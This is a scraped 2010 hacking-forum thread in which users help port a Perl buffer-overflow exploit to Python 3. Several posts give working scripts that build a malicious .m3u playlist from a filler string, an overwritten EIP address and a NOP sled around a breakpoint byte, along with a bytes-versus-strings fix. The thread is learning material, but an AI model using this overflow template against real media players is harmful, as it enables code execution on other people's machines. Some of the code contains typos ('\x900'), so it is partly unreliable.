@@ -1,0 +1,161 @@
+http://www.hackthissite.org/forums/viewtopic.php?p=46381
+Hack This Site Forum • View topic - Python Exploit from Perl Code Help!
+Skip to content
+[Advertise With HackThisSite.org]
+Hack This Site - Forums Index
+Board index ‹ Computers ‹ Programming ‹ Interpreted Languages
+Print view	FAQ
+Search
+Members	Login
+Python Exploit from Perl Code Help! For the discussion of Perl, Python, Ruby, and PHP and other interpreted languages.
+Post a reply
+13 posts	• Page 1 of 2 • 1, 2	Python Exploit from Perl Code Help!
+by the0nlyb0ss on Wed Sep 22, 2010 7:58 pm	([msg=46313]see Python Exploit from Perl Code Help![/msg])
+I've been learning basic buffer overflow exploits from a website; the website has the code in Perl, but as the fact that I'm a Python'er, I was wondering how I could do this! I've been Googling everything I can think of but can't find a solution So here is the original Perl code:Code: Select allmy $file= "test1.m3u";my $junk= "A" x 26094;my $eip = pack('V',0x000ff730); my $shellcode = "\x90" x 25; $shellcode = $shellcode."\xcc";$shellcode = $shellcode."\x90" x 25; open($FILE,">$file");print $FILE $junk.$eip.$shellcode;close($FILE);print "m3u File Created successfully\n";And here's what I try in Python (3.1):Code: Select allfrom struct import packfilename = 'test1.m3u'junk = "A" * 26059eip = pack('L', 0x0015fcc4)shellcode = "\x90" * 25shellcode = shellcode + "\xcc"shellcode = shellcode + ("\x900" * 25)file = open(filename, 'wb')file.write(junk + eip + shellcode)file.close()print("m3u file created succesfully")But it consistently gives me the:Code: Select allTraceback (most recent call last): File "C:\Buffer Overflow\crash.py", line 9, in <module> file.write(junk + eip + shellcode)TypeError: Can't convert 'bytes' object to str implicitlyI've tried lots of other things, such as decoding, encoding, rewriting the pack() statement, and others, but I most consistently get that error, any suggestions?? (Other than "Learn Perl")
+"Knowledge is knowing that a tomato is a fruit, but Wisdom is knowing not to put it in a fruit salad."
+the0nlyb0ss	Experienced User
+Posts: 54Joined: Thu Sep 02, 2010 11:24 pmLocation: California	Blog: View Blog (0)
+E-mail	Re: Python Exploit from Perl Code Help!
+by fabianhjr on Wed Sep 22, 2010 8:42 pm	([msg=46315]see Re: Python Exploit from Perl Code Help![/msg])
+Learn to use the Metasploit Framework. It is meant for that!If that doesn't work out for you then this(15.6.4) might(WARNING: BIG WALL OF TEXT!)
+Donate bitcoins to me! [1DhRP3hHgmSLQdRTZyT8VPTmzAj7Z2rsGA]Dunno what bitcoins are? BitcoinMe
+fabianhjr	Poster
+Posts: 286Joined: Tue Sep 21, 2010 7:48 pm	Blog: View Blog (0)
+E-mail	Re: Python Exploit from Perl Code Help!
+by Goatboy on Wed Sep 22, 2010 8:47 pm	([msg=46316]see Re: Python Exploit from Perl Code Help![/msg])
+Metasploit, when used by someone who doesn't understand WHY it works, is completely lame.Just taking a complete shot in the dark here, but it looks like it's having trouble interpreting your variables as strings. I'm not a Python person, but I know a lot of problems in just about any language can be cause by improper variable handling.
+Assume that everything I say is or could be a lie.1UHQ15HqBRZFykqx7mKHpYroxanLjJcUk
+Goatboy	Expert
+Posts: 2783Joined: Mon Jul 07, 2008 9:35 pm	Blog: View Blog (0)
+Re: Python Exploit from Perl Code Help!
+by the0nlyb0ss on Wed Sep 22, 2010 9:31 pm	([msg=46324]see Re: Python Exploit from Perl Code Help![/msg])
+Goatboy wrote:Metasploit, when used by someone who doesn't understand WHY it works, is completely lame.Exactly why I wanted to do it on my own before automating it with Metasploit, thanks.Goatboy wrote:Just taking a complete shot in the dark here, but it looks like it's having trouble interpreting your variables as strings. I'm not a Python person, but I know a lot of problems in just about any language can be cause by improper variable handling.This IS the problem I think, but if I properly convert bytes to strings, it can't decode.EDIT:I tried converting the strings to bytes instead of vice-versa, I think the file created properly now "Knowledge is knowing that a tomato is a fruit, but Wisdom is knowing not to put it in a fruit salad."
+the0nlyb0ss	Experienced User
+Posts: 54Joined: Thu Sep 02, 2010 11:24 pmLocation: California	Blog: View Blog (0)
+E-mail	Re: Python Exploit from Perl Code Help!
+by fabianhjr on Wed Sep 22, 2010 9:41 pm	([msg=46325]see Re: Python Exploit from Perl Code Help![/msg])
+Hey, the link I provided is about your issue someone else already solved and logged. Better read the link else I will feel bad about all the 1 hour googleing and reading.Click this(Section 15.6.4)(WARNING: BIG WALL OF TEXT!)
+Donate bitcoins to me! [1DhRP3hHgmSLQdRTZyT8VPTmzAj7Z2rsGA]Dunno what bitcoins are? BitcoinMe
+fabianhjr	Poster
+Posts: 286Joined: Tue Sep 21, 2010 7:48 pm	Blog: View Blog (0)
+E-mail	Re: Python Exploit from Perl Code Help!
+by the0nlyb0ss on Wed Sep 22, 2010 9:52 pm	([msg=46329]see Re: Python Exploit from Perl Code Help![/msg])
+I actually did read it already, and it's pretty much what got me to get the idea of converting all of it to bytes, thanks Also, I have that whole book in PDF, maybe I should get around to reading it "Knowledge is knowing that a tomato is a fruit, but Wisdom is knowing not to put it in a fruit salad."
+the0nlyb0ss	Experienced User
+Posts: 54Joined: Thu Sep 02, 2010 11:24 pmLocation: California	Blog: View Blog (0)
+E-mail	Re: Python Exploit from Perl Code Help!
+by fabianhjr on Thu Sep 23, 2010 6:10 am	([msg=46354]see Re: Python Exploit from Perl Code Help![/msg])
+Ok, be welcome. I am glad it helped. Donate bitcoins to me! [1DhRP3hHgmSLQdRTZyT8VPTmzAj7Z2rsGA]Dunno what bitcoins are? BitcoinMe
+fabianhjr	Poster
+Posts: 286Joined: Tue Sep 21, 2010 7:48 pm	Blog: View Blog (0)
+E-mail	Re: Python Exploit from Perl Code Help!
+by Defience on Thu Sep 23, 2010 2:42 pm	([msg=46368]see Re: Python Exploit from Perl Code Help![/msg])
+Running this in Python 2.6.1 worked without any issues. The only difference from 3.1 was removing the parenthesis in the print statement. Code: Select allfrom struct import packfilename = 'test1.m3u'junk = "A" * 26059eip = pack('L', 0x0015fcc4)shellcode = "\x90" * 25shellcode = shellcode + "\xcc"shellcode = shellcode + ("\x900" * 25)file = open(filename, 'wb')file.write(junk + eip + shellcode)file.close()print "m3u file created succesfully"
+Defience	Addict
+Posts: 1275Joined: Thu Jun 12, 2008 3:16 pm	Blog: View Blog (0)
+E-mail	Re: Python Exploit from Perl Code Help!
+by the0nlyb0ss on Thu Sep 23, 2010 7:01 pm	([msg=46381]see Re: Python Exploit from Perl Code Help![/msg])
+Point is, in the transition from 2 to 3, there was a lot more focus on Unicode and encoding and stuff like that, which is pretty much the problem here...The working code (for me) if anyone else has this issue ever was:Code: Select allfrom struct import packfilename = 'test1.m3u'junk = "A" * 26059eip = pack('L', 0x0015fcc4)shellcode = "\x90" * 25shellcode = shellcode + "\xcc"shellcode = shellcode + ("\x900" * 25)file = open(filename, 'wb')####THE CHANGED LINE####file.write(bytes(junk, 'utf-8') + eip + bytes(shellcode, 'utf-8'))file.close()print("m3u file created succesfully")
+"Knowledge is knowing that a tomato is a fruit, but Wisdom is knowing not to put it in a fruit salad."
+the0nlyb0ss	Experienced User
+Posts: 54Joined: Thu Sep 02, 2010 11:24 pmLocation: California	Blog: View Blog (0)
+E-mail	Re: Python Exploit from Perl Code Help!
+by tgoe on Thu Sep 23, 2010 8:43 pm	([msg=46387]see Re: Python Exploit from Perl Code Help![/msg])
+py3 makes a distinction between strings and data:Code: Select all#!/usr/bin/env pythonfrom struct import packfilename = 'test1.m3u'junk = "A" * 26059eip = pack('L', 0x0015fcc4)shellcode = "\x90" * 25shellcode = shellcode + "\xcc"shellcode = shellcode + ("\x900" * 25)file = open(filename, 'wb')file.write(junk + eip + shellcode)file.close()print("m3u file created succesfully")print(type(eip))print(eip)Code: Select all#!/usr/bin/env python3import sysfrom struct import packfilename = 'test2.m3u'junk = b"A" * 26059eip = pack('L', 0x0015fcc4)shellcode = b"\x90" * 25shellcode = shellcode + b"\xcc"shellcode = shellcode + (b"\x900" * 25)file = open(filename, 'wb')file.write(junk + eip + shellcode)file.close()print("m3u file created succesfully")print(type(eip))sys.stdout.buffer.write(eip)sys.stdout.write("\n")Code: Select all$ ./py2.py m3u file created succesfully<type 'str'>��$ ./py3.pym3u file created succesfully<class 'bytes'>��$ diff test1.m3u test2.m3u $ Notice the py3 code 'b' prefix to interpret the hardcoded "strings" as bytes. Also, you probably meant "\x90".
+tgoe	Contributor
+Posts: 629Joined: Sun Sep 28, 2008 2:33 pmLocation: q3dm7	Blog: View Blog (0)
+Next	Display posts from previous: All posts1 day7 days2 weeks1 month3 months6 months1 year
+Sort by AuthorPost timeSubject AscendingDescending Post a reply
+13 posts	• Page 1 of 2 • 1, 2	Return to Interpreted Languages
+Jump to:
+Select a forum
+------------------	Forum Guidelines
+Terms of Service & Additional Information
+HackThisSite
+News
+Comments & Suggestions
+General Discussion
+General
+Networking
+Telecommunications
+Hardware
+Books
+Off-Topic
+LULZ
+Idiots' Corner
+Gaming
+PDF's and Articles
+NZone
+Graveyard
+HTS Subprojects
+Store
+IRC
+Lectures
+Audio/IRC Downloads
+OFFICIAL Lecture Approvals
+Radio
+HTS Missions
+Basic
+Realistic
+(Real 1) Uncle Arnold's Local Band Review
+(Real 2) Chicago American Nazi Party
+(Real 3) Peace Poetry: HACKED
+(Real 4) Fischer's Animal Products
+(Real 5) Damn Telemarketers!
+(Real 6) ToxiCo Industrial Chemicals
+(Real 7) What's Right For America
+(Real 8) United Banks Of America
+(Real 9) CrappySoft
+(Real 10) Holy Word High School
+(Real 11) BudgetServ Web Hosting
+(Real 12) Heartland School District
+(Real 13) Elbonian Republican Party
+(Real 14) Yuppers Internet Solutions
+(Real 15) seculas Ltd.
+(Real 16) Simple Mail
+Hack This Site
+Application
+Programming
+Extended Basics
+Javascript
+Steganography
+IRC Missions
+Forensic
+User Submitted
+Computers
+Operating Systems
+Microsoft Windows
+*nix
+Mac
+Networking
+Crypto
+Malware
+Telecommunications
+Android
+iOS
+Windows
+Blackberry
+Programming
+C and C++
+Interpreted Languages
+Custom Code
+Web
+Social Engineering
+Philosophy
+Politics
+Ethics
+General
+Religion
+Math & Science
+Graphic Design & Web Design
+General design
+Web Design
+Modeling and Animation
+Who is online
+Users browsing this forum: No registered users and 0 guests
+Disclaimer : HackThisSite does not support illegal activities.The management of this board is not responsible for the content of any external internet sites.
+Board index
+The team • Delete all board cookies • All times are UTC - 5 hours Powered by phpBB © 2000-2009 phpBB Group
+Carbon Style By Echo -=Designs By Echo=- © 2007 Echo
+Administration Control Panel
+
